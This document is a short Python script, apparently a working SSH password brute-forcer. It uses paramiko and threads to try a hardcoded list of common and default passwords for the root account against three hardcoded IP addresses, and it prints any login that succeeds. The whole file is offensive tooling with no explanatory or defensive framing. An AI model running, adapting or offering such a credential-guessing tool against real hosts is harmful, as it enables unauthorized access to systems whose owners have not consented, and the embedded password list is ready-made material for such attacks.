import paramiko, socket, sys, time, threading, concurrent.futures, queue


def manual_auth(hostname, username, password, port=22):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((hostname, port))
    except Exception as e:
        print('*** Connect failed: ' + str(e))
        sys.exit(1)
    try:
        t = paramiko.Transport(sock)
        t.start_client()
    except paramiko.SSHException:
        print('*** SSH negotiation failed.')
        sys.exit()
    try:
        t.auth_password(username, password)
        if t.is_authenticated():
            return '%s\t%s\t%s\tOK' % (hostname, username, password)
        else:
            return '%s\t%s\t%s\tNOK' % (hostname, username, password)

    except:
        return '%s\t%s\t%s\tNOK' % (hostname, username, password)
    t.close()


def sshauth(tq, hostname, username, password, port=22):
    t = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((hostname, port))
        t = paramiko.Transport(sock)
        t.start_client()
        t.auth_password(username, password)
        if t.is_authenticated():
            t.close()
            tq.put((hostname, username, password, port))
            return 'Y'
        else:
            t.close()
            return 'E'
    except Exception as ex:
        if t:
            t.close()
        return 'N'


def hostauth(hostname, username, passwords, port=22):
    q = queue.Queue()
    threads = []
    '''
    for password in passwords:
        if sshauth(hostname, username, password, port) == 'Y':
            print('%s\t%s\t%s\tOK' % (hostname, username, password))
            break
    '''
    for password in passwords:
        threads.append(
            threading.Thread(
                target=sshauth, args=(q, hostname, username, password, port)))
    for t in threads:
        t.start()
        #if no sleep, sshexception will raise when using thread
        time.sleep(0.5)
    for t in threads:
        t.join()
    while not q.empty():
        print(q.get())
        for t in threads:
            if t.isAlive:
                t._stop()
        # time.sleep(0.5)
        break


hosts = ['110.1.1.65', '110.1.1.249', '110.1.1.130']
passwds = [
    "redhat", "P@ssw0rd", "password", "Dlxbdj5#", "Dlxbdj5h", "huawei",
    "Huawei", "Huawei12#$", "root", "Root", "admin", "Admin", "rootroot",
    "root123", "Root123", "abc123", "abc123_", "abc1234", "abcd1234",
    "www.1.com", "admin123", "Admin123"
]
# passwds = ['1', '2', '3', '4', '5', '6', '7', 'redhat']
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    tasks = []
    for host in hosts:
        tasks.append(executor.submit(hostauth, *(host, 'root', passwds, 22)))
    concurrent.futures.wait(tasks)
